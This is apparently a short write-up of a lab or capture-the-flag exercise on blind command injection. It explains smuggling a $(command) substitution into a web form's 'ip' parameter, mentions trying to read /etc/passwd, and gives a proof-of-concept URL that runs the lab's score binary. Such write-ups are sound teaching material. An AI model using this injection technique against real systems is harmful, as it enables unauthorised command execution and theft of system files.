## Solution
1. Visiting the website, I tried to use techinques used in previous exercises, but both the bugs were fixed by the developer.
2. So another way to exploit the system is by using the `$(command)`, where `command` is te command you want to execute
3. I tried with catting out the `/etc/passwd` file.
4. Similar to previous exercise, this one is also vulnerable to `Blind Command Injection`, I believe.
5. So I just replaced the `cat /etc/passwd` with the `score` command.
6. Once you see you command displayed back on the web-page, go and check the main exercise page, and you exercise is marked complete

## POC
```
https://[REDACTED].libcurl.so/?ip=$(/usr/local/bin/score%20[UUID])
```

```
$ ping -c 2 $(/usr/local/bin/score [UUID])  
```
